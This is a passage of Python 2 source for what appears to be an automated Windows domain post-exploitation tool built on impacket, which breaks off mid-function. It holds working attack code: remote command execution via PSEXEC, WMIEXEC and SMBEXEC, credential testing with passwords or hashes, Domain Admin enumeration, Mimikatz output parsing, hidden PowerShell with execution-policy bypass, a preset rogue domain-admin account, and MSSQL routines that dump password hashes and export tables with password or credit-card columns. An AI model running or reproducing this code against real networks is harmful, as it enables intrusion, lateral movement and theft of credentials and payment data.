#/usr/bin/env python
# -*- coding: utf-8 -*-

from deps.psexec import *
from deps.wmiexec import *
from deps.smbexec import *
from deps.secretsdump import *
from deps.smb_exploit import *
from deps.goldenPac import *
#from deps.ms14_068 import *
import Crypto
import argparse
import base64
import binascii
import cmd
import commands
import glob, subprocess
import logging
import os
import pyasn1
import random
import re
#import socket
import socket,commands,sys
import string
import sys
import tempfile
import threading
import time
import unicodedata
import xmltodict
from Crypto import Cipher
from Crypto import Random
from Crypto.Cipher import AES
import Crypto.Cipher.DES
from Crypto.Hash import MD5
from binascii import unhexlify
from dns import reversename, resolver
from impacket import tds, version
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5 import transport, rrp, scmr, rpcrt
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_NONE
from impacket.examples import logger
from impacket.structure import Structure
from impacket.system_errors import ERROR_NO_MORE_ITEMS
from impacket.tds import TDS_ERROR_TOKEN, TDS_LOGINACK_TOKEN
from impacket.winregistry import hexdump
from netaddr import IPNetwork
from nmb.NetBIOS import NetBIOS
from os import kill
from pyasn1.codec.der import decoder, encoder
from signal import alarm, signal, SIGALRM, SIGKILL
from smb.SMBConnection import SMBConnection as SMBConnection1
#from socket import * 
from struct import *
from struct import unpack
from subprocess import Popen, PIPE 
from tabulate import tabulate
from termcolor import colored, cprint
import Crypto.Cipher.DES
from shutil import copyfile
from SocketServer import ThreadingMixIn, ForkingMixIn
from BaseHTTPServer import HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler

try:
    import pyasn1
except ImportError:
     logging.critical('This module needs pyasn1 installed')
     logging.critical('You can get it from https://pypi.python.org/pypi/pyasn1')
     sys.exit(1)

'''
Prerequisites
apt install autoconf automake autopoint libtool pkg-config
git clone https://github.com/libyal/libesedb.git
cd libesedb/
./synclibs.sh
./autogen.sh
git clone https://github.com/csababarta/ntdsxtract
cd ntdsxtract
python setup.py install
'''

pathVolatility='/pentest/volatility/'
pathEsedb='/pentest/libesedb/esedbtools/'
pathNTDSExtract='/pentest/ntdsxtract/'

optionMS14068=True
optionTokenPriv=True

demo=False
debugMode=False

verbose=False
runAllModules=True
client_machine_name = 'localpcname'
totalAns=""
vulnStatus=False
bold=True
origScriptPath=os.getcwd()

domainAdminList=[]
#domainUserList=[]

localUserList=[]
attemptedCredList=[]

tmpCreateDAUsername="portia"
tmpCreateDAPassword="Password1"

outputBuffer1 = ''
tmpRegResultList1 = []
tmpRegResultList2 = []
tmpRegResultList3 = []
hashList=[]
passList=[]
userPassList=[]
userHashList=[]
daPassList=[]

verbose=False
netbiosName=""
liveList=[]
ipList=[]
folderDepth=4

dcCompromised=False

rdpList=[]
nbList=[]
dcList=[]
mssqlList=[]

accessOKHostList=[]
accessAdmHostList=[]
uncompromisedHostList=[]
compromisedHostList=[]

powershellCmdStart='powershell -Sta -executionpolicy bypass -noninteractive -nologo -window hidden '
powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

class ForkingSimpleServer(ForkingMixIn, HTTPServer):
    pass

#class RequestHandler(SimpleHTTPRequestHandler):
#    def do_GET(self):
#        print "here123"    
#        #self.send_response(200)
#        #self.end_headers()

class colors:
    def __init__(self):
        self.green = "\033[92m"
        self.blue = "\033[94m"
        self.bold = "\033[1m"
        self.yellow = "\033[93m"
        self.red = "\033[91m"
        self.end = "\033[0m"
color = colors()

class RemoteOperationsReg:

    def __init__(
        self,
        smbConnection,
        doKerberos,
        kdcHost=None,
        ):
        self.__smbConnection = smbConnection
        self.__smbConnection.setTimeout(5 * 60)
        self.__serviceName = 'RemoteRegistry'
        self.__stringBindingWinReg = r'ncacn_np:445[\pipe\winreg]'
        self.__rrp = None
        self.__regHandle = None

        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost

        self.__disabled = False
        self.__shouldStop = False
        self.__started = False

        self.__stringBindingSvcCtl = r'ncacn_np:445[\pipe\svcctl]'
        self.__scmr = None

    def getRRP(self):
        return self.__rrp

    def __connectSvcCtl(self):
        rpc = \
            transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def connectWinReg(self):
        rpc = \
            transport.DCERPCTransportFactory(self.__stringBindingWinReg)
        rpc.set_smb_connection(self.__smbConnection)
        self.__rrp = rpc.get_dce_rpc()
        self.__rrp.connect()
        self.__rrp.bind(rrp.MSRPC_UUID_RRP)

    def __checkServiceStatus(self):
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle,
                                  self.__serviceName)
        self.__serviceHandle = ans['lpServiceHandle']
        ans = scmr.hRQueryServiceStatus(self.__scmr,
                self.__serviceHandle)
        if ans['lpServiceStatus']['dwCurrentState'] \
            == scmr.SERVICE_STOPPED:
            logging.info('Service %s is in stopped state'
                         % self.__serviceName)
            self.__shouldStop = True
            self.__started = False
        elif ans['lpServiceStatus']['dwCurrentState'] \
            == scmr.SERVICE_RUNNING:
            logging.debug('Service %s is already running'
                          % self.__serviceName)
            self.__shouldStop = False
            self.__started = True
        else:
            raise Exception('Unknown service state 0x%x - Aborting'
                            % ans['CurrentState'])
        if self.__started is False:
            ans = scmr.hRQueryServiceConfigW(self.__scmr,
                    self.__serviceHandle)
            if ans['lpServiceConfig']['dwStartType'] == 0x4:
                logging.info('Service %s is disabled, enabling it'
                             % self.__serviceName)
                self.__disabled = True
                scmr.hRChangeServiceConfigW(self.__scmr,
                        self.__serviceHandle, dwStartType=0x3)
            logging.info('Starting service %s' % self.__serviceName)
            scmr.hRStartServiceW(self.__scmr, self.__serviceHandle)
            time.sleep(1)

    def enableRegistry(self):
        self.__connectSvcCtl()
        self.__checkServiceStatus()
        self.connectWinReg()

    def __restore(self):
        if self.__shouldStop is True:
            logging.info('Stopping service %s' % self.__serviceName)
            scmr.hRControlService(self.__scmr, self.__serviceHandle,
                                  scmr.SERVICE_CONTROL_STOP)
        if self.__disabled is True:
            logging.info('Restoring the disabled state for service %s'
                         % self.__serviceName)
            scmr.hRChangeServiceConfigW(self.__scmr,
                    self.__serviceHandle, dwStartType=0x4)

    def finish(self):
        self.__restore()
        if self.__rrp is not None:
            self.__rrp.disconnect()
        if self.__scmr is not None:
            self.__scmr.disconnect()


class RegHandler:

    def __init__(
        self,
        targetIP,
        domain,
        username,
        password,
        passwordHash,
        keyName,
        selectedKey,
        ):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__action = 'QUERY'
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__doKerberos = None
        self.__kdcHost = None
        self.__smbConnection = None
        self.__remoteOps = None
        self.__port = 445
        self.__keyName = keyName
        self.__selectedKey = selectedKey

        self.__regValues = {
            0: 'REG_NONE',
            1: 'REG_SZ',
            2: 'REG_EXPAND_SZ',
            0x3: 'REG_BINARY',
            0x4: 'REG_DWORD',
            5: 'REG_DWORD_BIG_ENDIAN',
            6: 'REG_LINK',
            7: 'REG_MULTI_SZ',
            11: 'REG_QWORD',
            }

        if passwordHash is not None:
            (self.__lmhash, self.__nthash) = passwordHash.split(':')

    def connect(self, remoteName, remoteHost):
        self.__smbConnection = SMBConnection2(remoteName, remoteHost,
                sess_port=int(self.__port))

        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
                self.__kdcHost,
                )
        else:
            try:
                self.__smbConnection.login(self.__username,
                        self.__password, self.__domain, self.__lmhash,
                        self.__nthash)
            except Exception, e:
                if 'bad username or authentication information' \
                    in str(e):
                    if len(self.__lmhash) < 1 and len(self.__nthash) \
                        < 1:
                        if [targetIP, 'Access Denied', self.__username
                            + '|' + self.__password, None] \
                            not in tmpRegResultList3:
                            tmpRegResultList3.append([targetIP,
                                    'Access Denied', self.__username
                                    + '|' + self.__password, None])
                    else:
                        tmpRegResultList3.append([targetIP,
                                'Access Denied', 'Invalid credentials: '
                                 + self.__username + '|'
                                + self.__lmhash + ':' + self.__nthash,
                                None])

    def run(self, remoteName, remoteHost):
        self.connect(remoteName, remoteHost)
        self.__remoteOps = RemoteOperationsReg(self.__smbConnection,
                self.__doKerberos, self.__kdcHost)

        try:
            self.__remoteOps.enableRegistry()
        except Exception, e:

            # logging.debug(str(e))
            # logging.warning('Cannot check RemoteRegistry status. Hoping it is started...')

            self.__remoteOps.connectWinReg()

        try:
            dce = self.__remoteOps.getRRP()

            if self.__action == 'QUERY':
                results = self.query(dce, self.__keyName,
                        self.__selectedKey)
                return (results, True)
            else:
                logging.error('Method %s not implemented yet!'
                              % self.__action)
        except (Exception, KeyboardInterrupt), e:
            results = str(e)
            return (results, False)
        finally:

            # logging.critical(str(e))

            if self.__remoteOps:
                self.__remoteOps.finish()

    def query(
        self,
        dce,
        keyName,
        selectedKey,
        ):

        # Let's strip the root key

        try:
            rootKey = keyName.split('\\')[0]
            subKey = '\\'.join(keyName.split('\\')[1:])
        except Exception:
            raise Exception('Error parsing keyName %s' % keyName)

        if rootKey.upper() == 'HKLM':
            ans = rrp.hOpenLocalMachine(dce)
        elif rootKey.upper() == 'HKU' or rootKey.upper() == 'HKCU':
            ans = rrp.hOpenCurrentUser(dce)
        elif rootKey.upper() == 'HKCR':
            ans = rrp.hOpenClassesRoot(dce)
        else:
            raise Exception('Invalid root key %s ' % rootKey)

        hRootKey = ans['phKey']
        ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey,
                                   samDesired=rrp.MAXIMUM_ALLOWED
                                   | rrp.KEY_ENUMERATE_SUB_KEYS
                                   | rrp.KEY_QUERY_VALUE)
        if len(selectedKey) > 0:
            value = rrp.hBaseRegQueryValue(dce, ans2['phkResult'],
                    str(selectedKey))
            return str(value[1])
        else:
            entriesList = self.__print_all_entries(dce, subKey + '\\',
                    ans2['phkResult'], 0)
            return entriesList

    def __print_key_values(self, rpc, keyHandler):
        i = 0
        resultList = []
        while True:
            try:
                ans4 = rrp.hBaseRegEnumValue(rpc, keyHandler, i)
                lp_value_name = (ans4['lpValueNameOut'])[:-1]
                if len(lp_value_name) == 0:
                    lp_value_name = '(Default)'
                lp_type = ans4['lpType']
                lp_data = ''.join(ans4['lpData'])

                # here1

                print '\t' + lp_value_name + '\t' \
                    + self.__regValues.get(lp_type, 'KEY_NOT_FOUND') \
                    + '\t',

                # print lp_value_name+"\t"+self.__regValues.get(lp_type, 'KEY_NOT_FOUND')
                # resultList.append('\t' + lp_value_name + '\t' + self.__regValues.get(lp_type, 'KEY_NOT_FOUND') + '\t',)

                self.__parse_lp_data(lp_type, lp_data)
                i += 1
            except rrp.DCERPCSessionError, e:
                if e.get_error_code() == ERROR_NO_MORE_ITEMS:
                    break
        return resultList

    def __print_all_entries(
        self,
        rpc,
        keyName,
        keyHandler,
        index,
        ):
        index = 0
        resultList = []
        while True:
            try:
                subkey = rrp.hBaseRegEnumKey(rpc, keyHandler, index)
                index += 1
                ans = rrp.hBaseRegOpenKey(rpc, keyHandler,
                        subkey['lpNameOut'],
                        samDesired=rrp.MAXIMUM_ALLOWED
                        | rrp.KEY_ENUMERATE_SUB_KEYS)
                newKeyName = keyName + (subkey['lpNameOut'])[:-1] + '\\'

                # print newKeyName

                resultList.append((subkey['lpNameOut'])[:-1])
            except rrp.DCERPCSessionError, e:

                # self.__print_key_values(rpc, ans['phkResult'])
                # self.__print_all_subkeys_and_entries(rpc, newKeyName, ans['phkResult'], 0)

                if e.get_error_code() == ERROR_NO_MORE_ITEMS:
                    break
            except rpcrt.DCERPCException, e:
                if str(e).find('access_denied') >= 0:
                    logging.error('Cannot access subkey %s, bypassing it'
                                   % (subkey['lpNameOut'])[:-1])
                    continue
                elif str(e).find('rpc_x_bad_stub_data') >= 0:
                    logging.error('Fault call, cannot retrieve value for %s, bypassing it'
                                   % (subkey['lpNameOut'])[:-1])
                    return
                raise
        return resultList

    def __print_all_subkeys_and_entries(
        self,
        rpc,
        keyName,
        keyHandler,
        index,
        ):
        index = 0
        while True:
            try:
                subkey = rrp.hBaseRegEnumKey(rpc, keyHandler, index)
                index += 1
                ans = rrp.hBaseRegOpenKey(rpc, keyHandler,
                        subkey['lpNameOut'],
                        samDesired=rrp.MAXIMUM_ALLOWED
                        | rrp.KEY_ENUMERATE_SUB_KEYS)
                newKeyName = keyName + (subkey['lpNameOut'])[:-1] + '\\'

                # print newKeyName

                self.__print_key_values(rpc, ans['phkResult'])
                self.__print_all_subkeys_and_entries(rpc, newKeyName,
                        ans['phkResult'], 0)
            except rrp.DCERPCSessionError, e:
                if e.get_error_code() == ERROR_NO_MORE_ITEMS:
                    break
            except rpcrt.DCERPCException, e:
                if str(e).find('access_denied') >= 0:
                    logging.error('Cannot access subkey %s, bypassing it'
                                   % (subkey['lpNameOut'])[:-1])
                    continue
                elif str(e).find('rpc_x_bad_stub_data') >= 0:
                    logging.error('Fault call, cannot retrieve value for %s, bypassing it'
                                   % (subkey['lpNameOut'])[:-1])
                    return
                raise

    @staticmethod
    def __parse_lp_data(valueType, valueData):
        try:
            if valueType == rrp.REG_SZ or valueType \
                == rrp.REG_EXPAND_SZ:
                if type(valueData) is int:
                    print 'NULL'
                else:
                    print '%s' % valueData.decode('utf-16le')[:-1]
            elif valueType == rrp.REG_BINARY:
                print ''
                hexdump(valueData, '\t')
            elif valueType == rrp.REG_DWORD:
                print '0x%x' % unpack('<L', valueData)[0]
            elif valueType == rrp.REG_QWORD:
                print '0x%x' % unpack('<Q', valueData)[0]
            elif valueType == rrp.REG_NONE:
                try:
                    if len(valueData) > 1:
                        print ''
                        hexdump(valueData, '\t')
                    else:
                        print ' NULL'
                except:
                    print ' NULL'
            elif valueType == rrp.REG_MULTI_SZ:
                print '%s' % valueData.decode('utf-16le')[:-2]
            else:
                print 'Unkown Type 0x%x!' % valueType
                hexdump(valueData)
        except Exception, e:
            logging.debug('Exception thrown when printing reg value %s'
                          , str(e))
            print 'Invalid data'

def getNetBiosName(ip):
    n = NetBIOS(broadcast=True, listen_port=0)
    netbiosName=''
    try:
        netbiosName=n.queryIPForName(ip)[0]
    except Exception:
        pass
    return netbiosName

def cleanUp():
    import glob, os
    for f in glob.glob(origScriptPath+"/modules/*.bat"):
        os.remove(f)    

def listDatabases(db,conn):
    sql_query='USE master; SELECT NAME FROM sysdatabases;'
    results= conn.RunSQLQuery(db,sql_query,tuplemode=False,wait=True)
    dbList=[]
    defaultDBList=[]
    defaultDBList.append('master')
    defaultDBList.append('tempdb')
    defaultDBList.append('model')
    defaultDBList.append('msdb')
    for x in results:
        for k, v in x.iteritems():
            if v not in defaultDBList:  
                dbList.append(v)
    return dbList

def listTables(db,conn,dbName):
    sql_query='SELECT * FROM '+dbName+'.INFORMATION_SCHEMA.TABLES;'
    results= conn.RunSQLQuery(db,sql_query,tuplemode=False,wait=True)
    tableList=[]
    for x in results:
        if x.values()[3]=='BASE TABLE':
            tableList.append([x.values()[0],x.values()[2]])
    return tableList
    #print tabulate(tableList)

def listColumns(db,conn,dbName,tableName):
    sql_query='use '+dbName+';exec sp_columns '+tableName+';'
    results= conn.RunSQLQuery(db,sql_query,tuplemode=False,wait=True)
    columnList=[]
    for x in results:
        columnName=x.values()[-1]
        columnList.append([dbName,tableName,columnName])
    return columnList
    #print tabulate(results)

def sampleData(db,conn,dbName,tableName):
    sql_query='use '+dbName+';select * from '+tableName+';'
    #sql_query='use '+dbName+';select TOP(10) * from '+tableName+';'
    try:
        results= conn.RunSQLQuery(db,sql_query,tuplemode=False,wait=True)
        return results
        #print tabulate(results)
    except Exception as e:
        print e
    #print tabulate(results)

def dumpSQLHashes(db,conn,pre2008=True):
    #sql_query='USE master; select @@version'
    resultList=[]
    if pre2008==False:
        sql_query='SELECT name,password_hash FROM sys.sql_logins;'
        print sql_query
        results= conn.RunSQLQuery(db,sql_query,tuplemode=False,wait=True)
        for x in results:
            print x.values()
            resultList.append(x.values)
    else:
        sql_query='SELECT password from master.dbo.sysxlogins;'
        print sql_query
        results= conn.RunSQLQuery(db,sql_query,tuplemode=False,wait=True)
        for x in results:
            print x.values()
            resultList.append(x.values)
    return resultList
    
def getSQLVersion(db,conn):
    sql_query='USE master; select @@version'
    print sql_query
    results= conn.RunSQLQuery(db,sql_query,tuplemode=False,wait=True)
    return results[0].values()

def testMSSQL(host,port,user,password,password_hash=None,domain=None,domainCred=True):
    searchList=[]
    searchList.append('passw')
    searchList.append('credit')
    searchList.append('card')
    fp = tds.MSSQL(host, int(port))
    fp.connect() 
    foundList=[]
    try:
        fp.login(None, user, password, domain, password_hash, domainCred)
        fp.replies[TDS_LOGINACK_TOKEN][0]
        dbVer=getSQLVersion(db,fp)
        print dbVer
        if "2008" in dbVer or "2012" in dbVer:
            print dumpSQLHashes(db,fp,True)
        else:
            print dumpSQLHashes(db,fp,False)        
        #listDatabases(db,fp)
        dbName='mmsdata1'   
        tableList=listTables(db,fp,dbName)
        for x in tableList:
            tableName=x[1]
            results = (listColumns(db,fp,dbName,tableName))
            for y in results:
                columnName = y[2]
                for word in searchList:
                    if word in columnName.lower():
                        if [y[0],y[1]] not in foundList:
                            foundList.append([y[0],y[1]])
    except Exception as e:
        print e
    fp.disconnect()
    
    fp = tds.MSSQL(host, int(port))
    fp.connect() 
    fp.login(None, user, password, domain, password_hash, domainCred)
    fp.replies[TDS_LOGINACK_TOKEN][0]
    for x in foundList:
        dbName=str(x[0])
        tableName=str(x[1])
        columnList=[]
        results=(listColumns(db,fp,dbName,tableName))
        for y in results:
            columnList.append(y[2])
        results=sampleData(db,fp,dbName,tableName)
        try:
            if len(results)>0:
                with open(dbName+"_"+tableName+".csv", "wb+") as f:
                    writer = csv.writer(f)
                    writer.writerow(columnList)
                    for y in results:
                        writer.writerow(y.values())
        except Exception as e:
            continue
#MSSQL Test

def testAdminAccess(tmphostno, tmpdomain, tmpusername, tmppassword, tmppasswordHash):
    command="ipconfig.exe"
    results=runWMIEXEC(tmphostno, tmpdomain, tmpusername, tmppassword, tmppasswordHash, command)        
    if len(results)>0 and type(results)!=None:
        return True
    else:
        return False

def testDomainCredentials(username,password,passwordHash,ip,domain):
    foundAdmin=False
    aesKey = None
    share = 'ADMIN$'
    nooutput = False
    k = False
    dc_ip = None
    command = 'ipconfig'
    if password!=None:
        passwordHash=None
    else:
        password=None
    executer = WMIEXEC(command,username,password,domain,passwordHash,aesKey,share,nooutput,k,dc_ip)
    loginStatus=executer.run(ip)
    resultsOutput=executer.getOutput()
    if "STATUS_LOGON_FAILURE" in str(loginStatus):
        if password!=None:
            print (setColor("[-]", bold, color="red"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+domain+"\\"+username+":"+password+" [FAILED]"
            return False,foundAdmin 
        else:
            print (setColor("[-]", bold, color="red"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+domain+"\\"+username+":"+passwordHash+" [FAILED]"
            return False,foundAdmin 
    else:
        if "rpc_s_access_denied" in str(loginStatus):
            if password!=None:
                print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+domain+"\\"+username+":"+password+" [OK]"
                return True,foundAdmin 
            else:
                print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+domain+"\\"+username+":"+passwordHash+" [OK]"
                return True,foundAdmin 
        else:
            if password!=None:
                print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+domain+"\\"+username+":"+password+" [OK][ADMIN]"
                foundAdmin=True
                return True,foundAdmin 
            else:
                print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+domain+"\\"+username+":"+passwordHash+" [OK][ADMIN]"
                foundAdmin=True
                return True,foundAdmin 


def testDomainCredentials1(username,password,hostNo):
    ansi_escape = re.compile(r'\x1b[^m]*m')
    password = ansi_escape.sub('', password)
    cmd = "rpcclient -U "+username+"%'"+password+"' "+hostNo+"  -c 'enumdomgroups'"
    resultList = runCommand(cmd, shell = True, timeout = 30)
    if "group:" in str(resultList):
        return True
    else:
        return False

def getDomainAdminUsers(username,password,hostNo):
    results=False
    userList1=[]
    cmd = "rpcclient -U "+username+"%'"+password+"' "+hostNo+" -c 'enumdomusers'"
    resultList = runCommand(cmd, shell = True, timeout = 15)
    if debugMode==True:
        print cmd
        print resultList
    list1 = resultList[1].split("\n")
    for x in list1:
        try:        
            domainUser = (x.split("] rid:[")[0]).replace("user:[","")
            userRID = (x.split("] rid:[")[1])[0:len(x.split("] rid:[")[1])-1]
            userList1.append([domainUser,userRID])
        except IndexError:
            continue

    cmd = "rpcclient -U "+username+"%'"+password+"' "+hostNo+" -c 'enumdomgroups' | grep -i 'Domain Admin' | awk -F'rid:' '{print $2}' | sed 's:^.\(.*\).$:\\1:'"
    resultList = runCommand(cmd, shell = True, timeout = 15)
    groupID = (resultList[1]).strip()
    cmd = "rpcclient -U "+username+"%'"+password+"' "+hostNo+" -c 'querygroupmem "+groupID+"' | awk -F']' '{print $1}' | awk -F'[' '{print $2}'"
    unFoundList=[]
    resultList = runCommand(cmd, shell = True, timeout = 15)    
    list1 = resultList[1].split("\n")
    for x in list1:
        found=False
        for y in userList1:
            if x==y[1]:
                found=True
                if y[0].lower() not in domainAdminList:
                    domainAdminList.append(y[0].lower())
        if found==False and len(x)>0:
            unFoundList.append(x)
    for x in unFoundList:
        #cmd = "/opt/local/bin/rpcclient -U "+username+"%"+password+" "+ip+" -c 'querygroupmem "+x+"' | awk -F']' '{print $1}' | awk -F'[' '{print $2}'"
        cmd = "rpcclient -U "+username+"%"+password+" "+ip+" -c 'querygroupmem "+x+"' | awk -F']' '{print $1}' | awk -F'[' '{print $2}'"
        resultList = runCommand(cmd, shell = True, timeout = 15)
        list1 = resultList[1].split("\n")
        for x in list1:
            for y in userList1:
                if x==y[1]:
                    if y[0].lower() not in domainAdminList:
                        domainAdminList.append(y[0].lower())
    if len(domainAdminList)>0:
        print (setColor("\nEnumerating Domain Admin Users Group", bold, color="green"))
        for x in domainAdminList:
            print x
        print "\n"
        if len(domainAdminList)>0:
            if username.lower() in domainAdminList:
                print "[+] Is '"+username+"' in the Domain Admin group?: "+(setColor("Yes", bold, color="red"))
                results=True
            else:
                print "[+] Is '"+username+"' in the Domain Admin group?: "+(setColor("No", bold, color="red"))
    #for x in userList1:
    #    print x[0]
    return results

def runPSEXEC(targetIP,domain,username,password,passwordHash,command):
    command='cmd /c echo . | '+command
    resultsOutput=''
    try:
        executer = PSEXEC(command,None,None,None,int(445),username,password,domain,passwordHash,None,False,None)       
        executer.run(targetIP,targetIP)
        resultsOutput=executer.getOutput()
        executer.clearOutput()
        return resultsOutput
    except Exception:
        pass

def runSMBEXEC(targetIP,domain,username,password,passwordHash,command):
    executer = CMDEXEC(username, password, domain, passwordHash, None, False, None, "SHARE", "C$", int(445), command)
    executer.run(targetIP, targetIP)
    resultsOutput = executer.getOutput()
    executer.stop()
    return resultsOutput

def runWMIEXEC(targetIP,domain,username,password,passwordHash,command):
    resultsOutput=''
    aesKey = None
    share = 'ADMIN$'
    nooutput = False
    k = False
    dc_ip = None
    executer = WMIEXEC(command,username,password,domain,passwordHash,aesKey,share,nooutput,k,dc_ip)
    statusOutput=executer.run(targetIP)
    resultsOutput=executer.getOutput()
    return resultsOutput

def setDemo():
    cmd ='date +%Y%m%d -s "20120418"'
    runCommand1(cmd)
def checkCurrentTime():
    currentTime=runCommand1("date")
    return currentTime
def checkRemoteTime(targetIP):
    remoteTime=runCommand1("net time -S "+targetIP)
    return remoteTime
def get_process_children(pid):
    p = Popen('ps --no-headers -o pid --ppid %d' % pid, shell = True,
              stdout = PIPE, stderr = PIPE)
    stdout, stderr = p.communicate()
    return [int(p) for p in stdout.split()]
def runCommand(args, cwd = None, shell = False, kill_tree = True, timeout = -1, env = None):
    class Alarm(Exception):
        pass
    def alarm_handler(signum, frame):
        raise Alarm
    p = Popen(args, shell = shell, cwd = cwd, stdout = PIPE, stderr = PIPE, env = env)
    if timeout != -1:
        signal(SIGALRM, alarm_handler)
        alarm(timeout)
    try:
        stdout, stderr = p.communicate()
        if timeout != -1:
            alarm(0)
    except Alarm:
        pids = [p.pid]
        if kill_tree:
            pids.extend(get_process_children(p.pid))
        for pid in pids:
            # process might have died before getting to this line
            # so wrap to avoid OSError: no such process
            try: 
                kill(pid, SIGKILL)
            except OSError:
                pass
        return -9, '', ''
    return p.returncode, stdout, stderr    
def runCommand1(fullCmd):
    try:
        return commands.getoutput(fullCmd)
    except Exception as e:
        print e
        return "Error executing command %s" %(fullCmd)
def setColor(message, bold=False, color=None, onColor=None):
    retVal = colored(message, color=color, on_color=onColor, attrs=("bold",))
    return retVal

def convertWinToLinux(filename):
    tmpFilename="/tmp/"+generateRandomStr()+".txt"
    sourceEncoding = "utf-16"
    targetEncoding = "utf-8"
    source = open(filename)
    target = open(tmpFilename, "w")
    target.write(unicode(source.read(), sourceEncoding).encode(targetEncoding))    
    return tmpFilename

def parseMimikatzOutput(list1):
    tmpPasswordList=[]
    username1=""
    domain1=""
    password1=""
    lmHash=""
    ntHash=""
    list2=list1.split("\n")
    for x in list2:
        if "Username :" in x or "Domain   :" in x or "Password :" in x or "LM       :" in x or "NTLM     :" in x:
            if "* Username :" in x:
                username1=(x.replace("* Username :","")).strip()
            if "* Domain   :" in x:
                domain1=(x.replace("* Domain   :","")).strip()
            if "* LM       :" in x:
                lmHash=(x.replace("* LM       :","")).strip()
            if "* NTLM     :" in x:
                ntHash=(x.replace("* NTLM     :","")).strip()
                if len(lmHash)<1:
                    lmHash='aad3b435b51404eeaad3b435b51404ee'
                password1=lmHash+":"+ntHash
            if "* Password :" in x:
                password1=x.replace("* Password :","")
            domain1=domain1.strip()
            username1=username1.strip()
            password1=password1.strip()
            if len(username1)>1 and len(domain1)>1 and len(password1)>1: 
                #if (domain1!="(null)" or username1!="(null)" or password1!="(null)"):
                if domain1!="(null)":                    
                    if not username1.endswith("$") and len(password1)<50:
                        if "\\" in username1:
                            domain1=username1.split("\\")[0]   
                            username1=username1.split("\\")[1]   
                        if len(password1)>0 and password1!='(null)':
                            if [domain1,username1,password1] not in tmpPasswordList:
                                tmpPasswordList.append([str(domain1),str(username1),str(password1)])
                username1=""
                domain1=""
                password1=""
                lmHash=""
                ntHash=""
    if len(tmpPasswordList)>0:
        print (setColor("[+]", bold, color="green"))+" Found the below credentials via Mimikatz"
        headers = ["Domain","Username","Password"]
        print tabulate(tmpPasswordList,headers,tablefmt="simple")
    return tmpPasswordList

def analyzeHashes(hashList):
    print (setColor("\n[+]", bold, color="green"))+" Analyzing Hashes for Patterns"
    #Blank 31d6cfe0d16ae931b73c59d7e0c089c0
    #NoLM  aad3b435b51404eeaad3b435b51404ee
    tmpBlankHashList=[]
    tmpHashList={}        
    for x in hashList:
        if "31d6cfe0d16ae931b73c59d7e0c089c0" in x:
            if x not in tmpBlankHashList:
                tmpBlankHashList.append(x)
        username=x.split(":")[0]
        uid=x.split(":")[1]
        tmpHash=x.split(":")[2]+":"+x.split(":")[3]    
        if tmpHash not in tmpHashList:   
            tmpHashList[tmpHash]=username
        else:
            tmpStr = tmpHashList[tmpHash]
            tmpStr += ", "+username
            tmpHashList[tmpHash]=tmpStr
    tmpResultList=[]
    for key, value in tmpHashList.iteritems():
        tmpResultList.append([key,value])
    if len(tmpResultList):
        print "Password Hashes Used By the Below Accounts"
        print tabulate(tmpResultList)
    if len(tmpBlankHashList):
        print "\nAccounts Using BLANK Password"
        for x in tmpBlankHashList:
            print x

def analyzeHashes1(hashList):
    print (setColor("\n[+]", bold, color="green"))+" Analyzing Hashes for Patterns"
    tmpHashList={}        
    for x in hashList:
        tmpip=x[0]
        tmpdomain=x[1]
        tmpusername=x[2]
        tmppasswordHash=x[3]
        if tmppasswordHash not in tmpHashList:   
            tmpHashList[tmppasswordHash]=tmpip+"("+tmpusername+")"
        else:
            tmpStr = tmpHashList[tmppasswordHash]
            tmpStr += "\n"+tmpip+"("+tmpusername+")"
            tmpHashList[tmppasswordHash]=tmpStr
    tmpResultList=[]
    for key, value in tmpHashList.iteritems():
        if [key,value] not in tmpResultList:
            tmpResultList.append([key,value])
    if len(tmpResultList):
        headers = ["Hashes","Host/Username"]
        for x in tmpResultList:
            hashStr=x[0]
            hostStr=x[1]
            if "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" in hashStr:
                print "[*] The below accounts have a blank password"
            else:
                print "[*] The below accounts use the password hash "+hashStr
            print hostStr
            print "\n"
        #print tabulate(tmpResultList,headers)

def analyzePasswords(tmpPassList):
    print (setColor("\n[+]", bold, color="green"))+" Analyzing Passwords for Patterns"
    tmpPassList1={}        
    for x in tmpPassList:
        tmpip=x[0]
        tmpdomain=x[1]
        tmpusername=x[2]
        tmppassword=x[3]
        if tmppassword not in tmpPassList1:   
            tmpPassList1[tmppassword]=tmpip+"("+tmpusername+")"
        else:
            tmpStr = tmpPassList1[tmppassword]
            tmpStr += ", "+tmpip+"("+tmpusername+")"
            tmpPassList1[tmppassword]=tmpStr
    tmpResultList=[]
    for key, value in tmpPassList1.iteritems():
        tmpResultList.append([key,value])
    if len(tmpResultList):
        headers = ["Password","Host/Username"]
